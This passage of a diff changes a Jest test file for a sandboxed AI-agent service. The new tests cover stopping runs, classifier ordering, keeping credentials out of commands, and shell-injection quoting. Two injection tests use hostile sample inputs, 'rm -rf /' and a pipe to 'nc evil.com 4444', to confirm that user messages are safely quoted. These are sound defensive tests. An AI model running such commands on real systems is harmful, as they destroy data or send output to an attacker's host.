-      mockQuery = jest.fn(() => makeQueryFromGenerator(yieldThenHang([makeContentBlockStop()])));
-      jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({ query: mockQuery }));
-
-      agentService = createAgentService();
-      const firstRun = agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'first',
-        userId: 'user-1',
-      });
-      await jest.advanceTimersByTimeAsync(0);
-
-      await agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'second',
-        userId: 'user-1',
-      });
-
-      expect(agentService['circuitBreakerTimers'].size).toBe(1);
-
-      await jest.advanceTimersByTimeAsync(120_000);
-      await firstRun.catch(() => undefined);
-    });
-
-    it('[P0] startCircuitBreakerTimer clears a pre-existing timer before setting a new one', async () => {
-      setupMockQuery([makeResultMessage(0.5)]);
-      agentService = createAgentService();
-      await agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'first',
-        userId: 'user-1',
-      });
-
-      setupMockQuery([makeResultMessage(0.6)]);
-      agentService = createAgentService();
-      await agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'second',
-        userId: 'user-1',
-      });
-
-      expect(agentService['circuitBreakerTimers'].size).toBeLessThanOrEqual(1);
     });
   });
 
-  describe('[P0] audit finding #1 — processAssistantMessage coverage', () => {
-    it('registers a tool_use delivered via an SDKAssistantMessage (type: "assistant") and routes its tool_result to the classifier', async () => {
-      // No preceding content_block_start stream event: the tool call is
-      // registered SOLELY by processAssistantMessage reading
-      // msg.message.content — the exact code path the audit found with ZERO
-      // coverage, and the exact bug class from the incident (old code read
-      // msg.content and the whole function was a no-op).
-      setupMockQuery([
-        makeAssistantToolUseMessage('tc-1', 'Bash', { command: 'echo hi' }),
-        makeToolResultUserMessage('tc-1', 'hi'),
-      ]);
-
-      agentService = createAgentService();
-      await agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      // processUserMessage only calls the classifier when the tool was
-      // registered. If processAssistantMessage failed to register the
-      // tool_use from the assistant message, classifyToolResult is never
-      // called — so this assertion directly proves processAssistantMessage ran
-      // and read msg.message.content correctly.
-      expect(mockClassifier.classifyToolResult).toHaveBeenCalledWith(
-        'tc-1',
-        'Bash',
-        expect.any(String),
-        'hi',
-        'user-1',
-      );
-    });
-  });
-
-  describe('[P0] regression — SDK iterator non-abort error emits RUN_ERROR (not RUN_FINISHED)', () => {
-    it('emits RUN_ERROR with the error message and does NOT emit RUN_FINISHED when iterator.next() rejects with a non-abort error', async () => {
-      // eslint-disable-next-line require-yield
-      async function* throwingGenerator(): AsyncGenerator<SDKMessage, void> {
-        throw new Error('spawn failed: ENOENT');
-      }
-      mockQuery = jest.fn(() => makeQueryFromGenerator(throwingGenerator()));
-      jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({ query: mockQuery }));
-
-      agentService = createAgentService();
-      const errorSpy = jest.spyOn(agentService['logger'], 'error');
-
-      await agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
-      expect(emittedEvents).toContain(EventType.RUN_ERROR);
-      expect(emittedEvents).not.toContain(EventType.RUN_FINISHED);
-
-      const errorCalls = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.RUN_ERROR,
-      );
-      expect(errorCalls[0][1].data.message).toBe('spawn failed: ENOENT');
-
-      expect(errorSpy).toHaveBeenCalledWith(
-        expect.stringContaining('spawn failed: ENOENT'),
-      );
-    });
-  });
-
-  // ─── Story 5.5: Interleave Tool and Semantic Pills Within the Agent Markdown Stream ──
-  //
-  // AC-9: segments persisted alongside content in Turn row
-  // AC-9: Tool call positions captured relative to text
+  // ─── Story 5.5: Segments persistence ─────────────────────────────────
 
   describe('[P0] Story 5.5 — segments persistence', () => {
     it('[P0] persists segments alongside content in Turn row', async () => {
-      setupMockQuery([
-        makeTextBlockStart(),
-        makeTextDeltaEvent('Let me check.'),
-        makeContentBlockStop(),
-        makeToolUseBlockStart('tc-1', 'Bash', { command: 'git status' }),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'nothing to commit'),
-        makeTextBlockStart(),
-        makeTextDeltaEvent('Done.'),
-        makeContentBlockStop(),
-        makeResultMessage(0.42),
+      const bridge = createMockEventBridge([
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Let me check.' } },
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"}' } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Done.' } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -1361,18 +1190,16 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
     });
 
     it('[P0] segments array contains text and tool_call segments in order', async () => {
-      setupMockQuery([
-        makeTextBlockStart(),
-        makeTextDeltaEvent('Before tool.'),
-        makeContentBlockStop(),
-        makeToolUseBlockStart('tc-1', 'Bash', { command: 'ls' }),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'file.txt'),
-        makeTextBlockStart(),
-        makeTextDeltaEvent('After tool.'),
-        makeContentBlockStop(),
-        makeResultMessage(0.42),
+      const bridge = createMockEventBridge([
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Before tool.' } },
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"ls"}' } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'file.txt', role: 'tool', isError: false } },
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'After tool.' } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -1401,12 +1228,14 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
     });
 
     it('[P0] tool_call segment captures toolCallId, toolName, and status', async () => {
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash', { command: 'git status' }),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'nothing to commit'),
-        makeResultMessage(0.42),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"}' } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -1431,6 +1260,374 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(toolCallSegment.toolCall).toHaveProperty('toolCallId', 'tc-1');
       expect(toolCallSegment.toolCall).toHaveProperty('toolName', 'Bash');
       expect(toolCallSegment.toolCall.status).toBe('completed');
+    });
+  });
+
+  // ─── Story 6.3: stop() and onModuleDestroy() delegate to AguiEventBridgeService ──
+
+  describe('[P0] Story 6.3 — stop() and onModuleDestroy() delegate to AguiEventBridgeService (AC-3, AC-6)', () => {
+    it('[P0] stop() calls aguiEventBridgeService.stop(conversationId) (AC-3)', async () => {
+      const bridge = createControllableEventBridge();
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      const runTurnPromise = agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+      runTurnPromise.catch(() => undefined);
+      await jest.advanceTimersByTimeAsync(0);
+
+      await agentService.stop('conv-1');
+
+      expect(bridge.stop).toHaveBeenCalledWith('conv-1');
+      // The controllable bridge's stop() rejects the stream with AGENT_STOPPED —
+      // runTurn's catch fires (skips RUN_ERROR) and finally cleans up. Await
+      // it so no never-resolving promise is left dangling.
+      await runTurnPromise;
+    });
+
+    it('[P0] stop() emits RUN_FINISHED after aguiEventBridgeService.stop() (AC-3)', async () => {
+      const bridge = createControllableEventBridge();
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      const runTurnPromise = agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+      runTurnPromise.catch(() => undefined);
+      await jest.advanceTimersByTimeAsync(0);
+
+      emitSpy.mockClear();
+      await agentService.stop('conv-1');
+
+      const finishedCalls = emitSpy.mock.calls.filter(
+        (c) => c[1]?.event === EventType.RUN_FINISHED,
+      );
+      // Exactly one RUN_FINISHED (from stop()); runTurn's catch skips it for
+      // AGENT_STOPPED — no double emission.
+      expect(finishedCalls).toHaveLength(1);
+      await runTurnPromise;
+    });
+
+    it('[P0] onModuleDestroy() calls aguiEventBridgeService.stop() for each active run (AC-6)', async () => {
+      const bridge = createControllableEventBridge();
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      const run1 = agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'first',
+        userId: 'user-1',
+      });
+      const run2 = agentService.runTurn({
+        conversationId: 'conv-2',
+        sandboxId: 'sb-2',
+        message: 'second',
+        userId: 'user-2',
+      });
+      run1.catch(() => undefined);
+      run2.catch(() => undefined);
+      await jest.advanceTimersByTimeAsync(0);
+
+      agentService.onModuleDestroy();
+
+      expect(bridge.stop).toHaveBeenCalledWith('conv-1');
+      expect(bridge.stop).toHaveBeenCalledWith('conv-2');
+      // Settle the in-flight runs (onModuleDestroy fire-and-forgets bridge.stop()
+      // which rejects the streams with AGENT_STOPPED).
+      await run1;
+      await run2;
+    });
+  });
+
+  // ─── Bug M3: stop() must await pending classifier promises (regression) ──
+
+  describe('[P0] Bug M3 — stop() awaits pending classifier promises before RUN_FINISHED', () => {
+    it('[P0] stop() captures pendingPromises before bridge.stop() — classifier SSE event arrives before RUN_FINISHED', async () => {
+      // Classifier promise that we resolve manually — simulates a slow
+      // classifier whose SSE event must arrive before RUN_FINISHED.
+      let resolveClassifier!: (value: unknown) => void;
+      mockClassifier.classifyToolResult.mockReturnValue(
+        new Promise((resolve) => {
+          resolveClassifier = resolve;
+        }),
+      );
+
+      const bridge = createControllableEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'output', role: 'tool', isError: false } },
+      ]);
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      const runTurnPromise = agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+      runTurnPromise.catch(() => undefined);
+      // Let the bridge feed events and park — the classifier promise is now
+      // in pendingClassifierPromises.
+      await jest.advanceTimersByTimeAsync(0);
+
+      // Start stop() — it captures pendingPromises EARLY, then awaits
+      // bridge.stop() (which rejects the stream with AGENT_STOPPED), then
+      // awaits Promise.allSettled on the captured array. Don't await yet —
+      // the classifier hasn't resolved.
+      const stopPromise = agentService.stop('conv-1');
+      stopPromise.catch(() => undefined);
+
+      // Let bridge.stop() fire and runTurn's catch process AGENT_STOPPED
+      // (runTurn's finally deletes the Map entry — but stop() already captured
+      // the array reference, so Promise.allSettled is NOT vacuous).
+      await jest.advanceTimersByTimeAsync(0);
+
+      // Resolve the classifier — its .then emits TOOL_CALL_PROMOTED.
+      resolveClassifier({
+        type: 'TOOL_CALL_PROMOTED',
+        toolCallId: 'tc-1',
+        artifactType: 'prd',
+        artifactTitle: 'My PRD',
+        artifactId: 'art-1',
+        viewHref: '/artifacts?id=art-1',
+      });
+
+      // Now stop() can complete — Promise.allSettled resolves, then
+      // RUN_FINISHED is emitted.
+      await stopPromise;
+      await runTurnPromise;
+
+      const events = emitSpy.mock.calls.map((c) => c[1]?.event);
+      const promotedIndex = events.indexOf('TOOL_CALL_PROMOTED');
+      const finishedIndex = events.indexOf(EventType.RUN_FINISHED);
+
+      // Bug M3 regression: the classifier's SSE event must arrive BEFORE
+      // RUN_FINISHED. Without the early-capture fix, stop() would read
+      // pendingClassifierPromises AFTER runTurn's finally deleted it (the
+      // ?? [] fallback makes it empty), skip the await, and emit RUN_FINISHED
+      // before the classifier resolves.
+      expect(promotedIndex).toBeGreaterThan(-1);
+      expect(finishedIndex).toBeGreaterThan(-1);
+      expect(promotedIndex).toBeLessThan(finishedIndex);
+    });
+  });
+
+  // ─── Story 6.3 AC-2: Regression guards — credential-isolation + input-injection ──
+
+  describe('[P0] Story 6.3 AC-2 — Regression guards: credential-isolation + input-injection for command construction', () => {
+    function captureCommand(): {
+      bridge: { streamAgentEvents: jest.Mock; stop: jest.Mock };
+      getCommand: () => string;
+    } {
+      let capturedCommand = '';
+      const bridge = {
+        streamAgentEvents: jest.fn(async (params: { command?: string }) => {
+          capturedCommand = params.command ?? '';
+        }),
+        stop: jest.fn().mockResolvedValue(undefined),
+      };
+      return { bridge, getCommand: () => capturedCommand };
+    }
+
+    it('[P0] command passed to streamAgentEvents does NOT contain platform credentials', async () => {
+      const { bridge, getCommand } = captureCommand();
+      mockEventBridge = bridge;
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      const command = getCommand();
+      expect(command).not.toContain('DATABASE_URL');
+      expect(command).not.toContain('AUTH_SECRET');
+      expect(command).not.toContain('DAYTONA_API_KEY');
+      expect(command).not.toContain('DAYTONA_API_URL');
+      expect(command).not.toContain('CREDENTIAL_ENCRYPTION_KEK');
+    });
+
+    it('[P0] ANTHROPIC_API_KEY and GITHUB_TOKEN are NOT interpolated into the command (injected via sandbox env only)', async () => {
+      process.env.ANTHROPIC_API_KEY = 'sk-ant-test-key';
+      try {
+        const { bridge, getCommand } = captureCommand();
+        mockEventBridge = bridge;
+        agentService = createAgentService();
+        await agentService.runTurn({
+          conversationId: 'conv-1',
+          sandboxId: 'sb-1',
+          message: 'test',
+          userId: 'user-1',
+        });
+
+        const command = getCommand();
+        expect(command).not.toContain('sk-ant-test-key');
+        expect(command).not.toContain('ANTHROPIC_API_KEY');
+        expect(command).not.toContain('GITHUB_TOKEN');
+      } finally {
+        delete process.env.ANTHROPIC_API_KEY;
+      }
+    });
+
+    it('[P0] malicious user message cannot inject additional shell commands into the sandbox-agent command', async () => {
+      const { bridge, getCommand } = captureCommand();
+      mockEventBridge = bridge;
+      agentService = createAgentService();
+      const maliciousMessage = 'hello"; rm -rf / #';
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: maliciousMessage,
+        userId: 'user-1',
+      });
+
+      const command = getCommand();
+      // The malicious payload must be safely shell-quoted — the entire message
+      // is wrapped in single quotes so the shell treats it as a literal string
+      // argument to --prompt. If the message were unquoted, the `;` would
+      // terminate the --prompt argument and `rm -rf /` would execute as a
+      // separate command.
+      expect(command).toContain("'hello\"; rm -rf / #'");
+    });
+
+    it('[P0] user message with shell metacharacters is safely quoted in the command', async () => {
+      const { bridge, getCommand } = captureCommand();
+      mockEventBridge = bridge;
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'echo $(whoami) | nc evil.com 4444',
+        userId: 'user-1',
+      });
+
+      const command = getCommand();
+      // The subshell injection must not execute — the entire message is
+      // single-quoted so $(whoami) and the pipe are literal strings. If the
+      // message were unquoted, the pipe would chain `nc evil.com` as a
+      // separate command.
+      expect(command).toContain("'echo $(whoami) | nc evil.com 4444'");
+    });
+  });
+
+  // ─── Story 6.4 AC-4: Host-filesystem regression guards ──────────────
+  //
+  // Regression guards for the sandbox-based execution model (Stories 6.1–6.3).
+  // They verify the agent runs inside the sandbox (cwd: 'repo') and working-tree
+  // operations target the sandbox filesystem via sandboxId — preventing a future
+  // regression back to host-based execution.
+  //
+  // Guard patterns follow the sibling Story 6.3 regression-guard block
+  // (lines 1315-1431): `captureCommand()` helper for streamAgentEvents
+  // params, `createMockEventBridge()` for AG-UI event feeding, and
+  // `jest.spyOn(sandboxFake, 'getWorkingTreeStatus')` for sandbox-call
+  // assertion. The credential-isolation + input-injection invariants for
+  // `buildAgentCommand` (the user-controlled-input command site) are already
+  // covered by the 6.3 block (lines 1330-1410); these tests extend that
+  // uniform guard template with the cwd + sandboxId invariants.
+
+  describe('[P0] Story 6.4 AC-4 — Host-filesystem regression guards (sandbox-targeted execution)', () => {
+    function captureStreamParams(): {
+      bridge: { streamAgentEvents: jest.Mock; stop: jest.Mock };
+      getParams: () => { command: string; cwd?: string; sandboxId?: string };
+    } {
+      let capturedParams: { command: string; cwd?: string; sandboxId?: string } = { command: '' };
+      const bridge = {
+        streamAgentEvents: jest.fn(async (params: {
+          command?: string;
+          cwd?: string;
+          sandboxId?: string;
+        }) => {
+          capturedParams = {
+            command: params.command ?? '',
+            cwd: params.cwd,
+            sandboxId: params.sandboxId,
+          };
+        }),
+        stop: jest.fn().mockResolvedValue(undefined),
+      };
+      return { bridge, getParams: () => capturedParams };
+    }
+
+    // Task 3.1 — buildAgentCommand() runs inside the sandbox (cwd: 'repo'),
+    // NOT on the host. Regression guard for the host-based → sandbox
+    // execution migration (Story 6.3).
+    it('[P0] streamAgentEvents receives cwd: "repo" (agent runs inside the sandbox, not on the host)', async () => {
+      const { bridge, getParams } = captureStreamParams();
+      mockEventBridge = bridge;
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      expect(getParams().cwd).toBe('repo');
+    });
+
+    // Task 3.2 — getWorkingTreeStatus is called with the active run's
+    // sandboxId, NOT a host path. Verifies working-tree operations target the
+    // sandbox filesystem. (The `commit` sandboxId assertion is covered by
+    // manual-commit.service.spec.ts — not duplicated here per DP-2: AgentService
+    // does not call commit; ManualCommitService does, and its existing tests
+    // pass sandboxId through SandboxServiceFake.getCommitCalls().)
+    it('[P0] getWorkingTreeStatus is called with the active run sandboxId, not a host path', async () => {
+      (sandboxFake.getWorkingTreeStatus as jest.Mock).mockResolvedValue({
+        dirty: true,
+        files: ['src/foo.ts'],
+      });
+      const wtSpy = jest.spyOn(sandboxFake, 'getWorkingTreeStatus');
+
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Write', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File written', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
+      ]);
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      expect(wtSpy).toHaveBeenCalledWith('sb-1');
+    });
+  });
+
+  // ─── Story 6.3 AC-4: Host-based SDK code removed ─────────────────────
+
+  describe('[P0] Story 6.3 AC-4 — Host-based SDK code removed', () => {
+    it('[P0] AgentService no longer imports query/Query/SDKMessage from @anthropic-ai/claude-agent-sdk', async () => {
+      // After the migration, agent.service.ts must not import from
+      // @anthropic-ai/claude-agent-sdk. The module is mocked in jest config
+      // (moduleNameMapper), so we verify the source file does not reference it.
+      // eslint-disable-next-line @typescript-eslint/no-var-requires
+      const fs = require('fs');
+      // eslint-disable-next-line @typescript-eslint/no-var-requires
+      const path = require('path');
+      const source = fs.readFileSync(
+        path.resolve(__dirname, 'agent.service.ts'),
+        'utf-8',
+      );
+      expect(source).not.toContain('@anthropic-ai/claude-agent-sdk');
+      expect(source).not.toContain('from \'os\'');
+      expect(source).not.toContain('tmpdir');
+      expect(source).not.toContain('AGENT_WORKDIR');
     });
   });
 });
